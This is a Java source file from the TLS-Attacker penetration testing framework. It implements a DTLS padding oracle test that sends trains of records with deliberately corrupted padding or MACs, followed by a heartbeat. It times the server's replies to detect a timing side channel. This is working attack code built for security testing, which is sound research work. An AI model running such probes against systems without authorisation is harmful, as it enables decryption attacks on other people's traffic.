/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS.
 *
 * Copyright (C) 2015 Chair for Network and Data Security,
 *                    Ruhr University Bochum
 *                    (juraj.somorovsky@rub.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.tlsattacker.attacks.config.DtlsPaddingOracleAttackTestCommandConfig;
import de.rub.nds.tlsattacker.tls.Attacker;
import de.rub.nds.tlsattacker.dtls.record.handlers.RecordHandler;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
import de.rub.nds.tlsattacker.tls.constants.ConnectionEnd;
import de.rub.nds.tlsattacker.tls.protocol.ProtocolMessage;
import de.rub.nds.tlsattacker.tls.protocol.alert.messages.AlertMessage;
import de.rub.nds.tlsattacker.tls.protocol.application.messages.ApplicationMessage;
import de.rub.nds.tlsattacker.tls.protocol.constants.ProtocolMessageType;
import de.rub.nds.tlsattacker.tls.protocol.heartbeat.messages.HeartbeatMessage;
import de.rub.nds.tlsattacker.dtls.record.messages.Record;
import de.rub.nds.tlsattacker.tls.protocol.alert.constants.AlertDescription;
import de.rub.nds.tlsattacker.tls.protocol.alert.constants.AlertLevel;
import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.transport.TransportHandler;
import de.rub.nds.tlsattacker.util.RandomHelper;
import java.io.FileWriter;
import java.io.IOException;
import java.net.SocketTimeoutException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * Tests if the subject can be used as a padding oracle by sending messages with
 * invalid MACs or invalid paddings.
 * 
 * @author Florian Pfützenreuter <florian.pfuetzenreuter@rub.de>
 */
public class DtlsPaddingOracleAttackTest extends Attacker<DtlsPaddingOracleAttackTestCommandConfig> {

    public static Logger LOGGER = LogManager.getLogger(DtlsPaddingOracleAttackTest.class);

    private TlsContext tlsContext;

    private RecordHandler recordHandler;

    private List<ProtocolMessage> protocolMessages;

    private TransportHandler transportHandler;

    private final ModifiableByteArray modifiedPaddingArray = new ModifiableByteArray(),
	    modifiedMacArray = new ModifiableByteArray();

    private WorkflowExecutor workflowExecutor;

    private WorkflowTrace trace;

    public DtlsPaddingOracleAttackTest(DtlsPaddingOracleAttackTestCommandConfig config) {
	super(config);
    }

    @Override
    public void executeAttack(ConfigHandler configHandler) {
	initExecuteAttack(configHandler);

	long[][] resultBuffer = new long[config.getNrOfRounds()][2];
	FileWriter fileWriter;
	StringBuilder sb;
	int counter = 0;

	workflowExecutor.executeWorkflow();

	try {
	    sb = new StringBuilder(50);
	    for (int i = 0; i < config.getNrOfRounds(); i++) {
		resultBuffer[i] = executeAttackRound();

		sb.append(i + 1);
		sb.append(" of ");
		sb.append(config.getNrOfRounds());
		sb.append(" rounds.\n");
		LOGGER.info(sb.toString());
		sb.setLength(0);
	    }

	    if (config.getResultFilePath() != null) {
		sb = new StringBuilder(2097152);
		fileWriter = new FileWriter(config.getResultFilePath(), true);

		for (long[] roundResults : resultBuffer) {
		    sb.append(counter);
		    sb.append(";invalid_Padding;");
		    sb.append(roundResults[0]);
		    sb.append("\n");
		    counter++;
		    sb.append(counter);
		    sb.append(";invalid_MAC;");
		    sb.append(roundResults[1]);
		    sb.append("\n");
		    counter++;
		    // Limit string builder RAM usage to about 4 MiByte by
		    // writing out data
		    if (sb.length() > 2097000) {
			fileWriter.write(sb.toString());
			sb.setLength(0);
		    }
		}

		fileWriter.write(sb.toString());
		fileWriter.close();
	    }
	} catch (IOException e) {
	    LOGGER.info(e.getLocalizedMessage());
	}

	closeDtlsConnectionGracefully();

	transportHandler.closeConnection();
    }

    private long[] executeAttackRound() throws IOException {
	byte[] roundMessageData = new byte[config.getTrainMessageSize()];
	RandomHelper.getRandom().nextBytes(roundMessageData);
	HeartbeatMessage sentHbMessage = new HeartbeatMessage();
	sentHbMessage.getProtocolMessageHandler(tlsContext).prepareMessage();

	byte[][] invalidPaddingTrain = createInvalidPaddingMessageTrain(config.getMessagesPerTrain(), roundMessageData,
		sentHbMessage);
	byte[][] invalidMacTrain = createInvalidMacMessageTrain(config.getMessagesPerTrain(), roundMessageData,
		sentHbMessage);
	long[] results = new long[2];

	results[0] = handleTrain(invalidPaddingTrain, sentHbMessage.getPayload().getValue(), "Invalid Padding");

	results[1] = handleTrain(invalidMacTrain, sentHbMessage.getPayload().getValue(), "Invalid MAC");

	return results;
    }

    private long handleTrain(byte[][] train, byte[] sentHeartbeatMessagePayload, String trainInfo) {
	try {
	    long startNanos, endNanos, result;

	    for (byte[] record : train) {
		transportHandler.sendData(record);
	    }

	    startNanos = System.nanoTime();
	    byte[] serverAnswer = transportHandler.fetchData();
	    endNanos = System.nanoTime();
	    result = endNanos - startNanos;

	    if (serverAnswer != null && serverAnswer.length > 1) {
		HeartbeatMessage receivedHbMessage = new HeartbeatMessage();
		List<de.rub.nds.tlsattacker.tls.record.messages.Record> parsedReceivedRecords = recordHandler
			.parseRecords(serverAnswer);
		if (parsedReceivedRecords.size() != 1) {
		    LOGGER.info("Unexpected number of records parsed from server. Train: " + trainInfo);
		} else {
		    receivedHbMessage.getProtocolMessageHandler(tlsContext).parseMessage(
			    parsedReceivedRecords.get(0).getProtocolMessageBytes().getValue(), 0);
		    if (!Arrays.equals(receivedHbMessage.getPayload().getValue(), sentHeartbeatMessagePayload)) {
			LOGGER.info("Heartbeat answer didn't contain the correct payload. Train: " + trainInfo);
		    } else {
			LOGGER.info("Correct heartbeat-payload received. Train: " + trainInfo);
		    }
		}
	    } else {
		LOGGER.info("No data from the server was received. Train: " + trainInfo);
	    }
	    return result;
	} catch (SocketTimeoutException e) {
	    LOGGER.info("Receive timeout when waiting for heartbeat answer. Train: " + trainInfo);
	} catch (Exception e) {
	    LOGGER.info(e.getMessage());
	}
	return -1;
    }

    private byte[][] createInvalidPaddingMessageTrain(int n, byte[] messageData, HeartbeatMessage heartbeatMessage) {
	byte[][] train = new byte[n + 1][];
	List<de.rub.nds.tlsattacker.tls.record.messages.Record> records = new ArrayList<>();
	ApplicationMessage apMessage = new ApplicationMessage(ConnectionEnd.CLIENT);
	protocolMessages.add(apMessage);
	Record record;
	apMessage.setData(messageData);

	for (int i = 0; i < n; i++) {
	    record = new Record();
	    record.setPadding(modifiedPaddingArray);
	    records.add(record);
	    train[i] = recordHandler.wrapData(messageData, ProtocolMessageType.APPLICATION_DATA, records);
	    records.remove(0);
	}

	records.add(new Record());
	protocolMessages.add(heartbeatMessage);
	train[n] = recordHandler.wrapData(heartbeatMessage.getCompleteResultingMessage().getValue(),
		ProtocolMessageType.HEARTBEAT, records);

	return train;
    }

    private byte[][] createInvalidMacMessageTrain(int n, byte[] applicationMessageContent,
	    HeartbeatMessage heartbeatMessage) {
	byte[][] train = new byte[n + 1][];
	List<de.rub.nds.tlsattacker.tls.record.messages.Record> records = new ArrayList<>();
	ApplicationMessage apMessage = new ApplicationMessage(ConnectionEnd.CLIENT);
	protocolMessages.add(apMessage);
	apMessage.setData(applicationMessageContent);

	Record record = new Record();
	record.setMac(modifiedMacArray);
	records.add(record);
	byte[] recordBytes = recordHandler.wrapData(applicationMessageContent, ProtocolMessageType.APPLICATION_DATA,
		records);

	for (int i = 0; i < n; i++) {
	    train[i] = recordBytes;
	}

	records.remove(0);
	records.add(new Record());
	protocolMessages.add(heartbeatMessage);
	train[n] = (recordHandler.wrapData(heartbeatMessage.getCompleteResultingMessage().getValue(),
		ProtocolMessageType.HEARTBEAT, records));

	return train;
    }

    private void closeDtlsConnectionGracefully() {
	AlertMessage closeNotify = new AlertMessage();
	closeNotify.setConfig(AlertLevel.FATAL, AlertDescription.CLOSE_NOTIFY);
	List<de.rub.nds.tlsattacker.tls.record.messages.Record> records = new ArrayList<>();
	records.add(new Record());

	try {
	    transportHandler.sendData(recordHandler.wrapData(closeNotify.getProtocolMessageHandler(tlsContext)
		    .prepareMessage(), ProtocolMessageType.ALERT, records));
	} catch (IOException e) {
	    LOGGER.error(e.getLocalizedMessage());
	}
    }

    private void initExecuteAttack(ConfigHandler configHandler) {
	transportHandler = configHandler.initializeTransportHandler(config);
	tlsContext = configHandler.initializeTlsContext(config);
	workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);
	recordHandler = (RecordHandler) tlsContext.getRecordHandler();
	trace = tlsContext.getWorkflowTrace();
	protocolMessages = trace.getProtocolMessages();
	modifiedPaddingArray.setModification(ByteArrayModificationFactory.xor(new byte[] { 1 }, 0));
	modifiedMacArray.setModification(ByteArrayModificationFactory.xor(new byte[] { 0x50, (byte) 0xFF, 0x1A, 0x7C },
		0));
    }
}
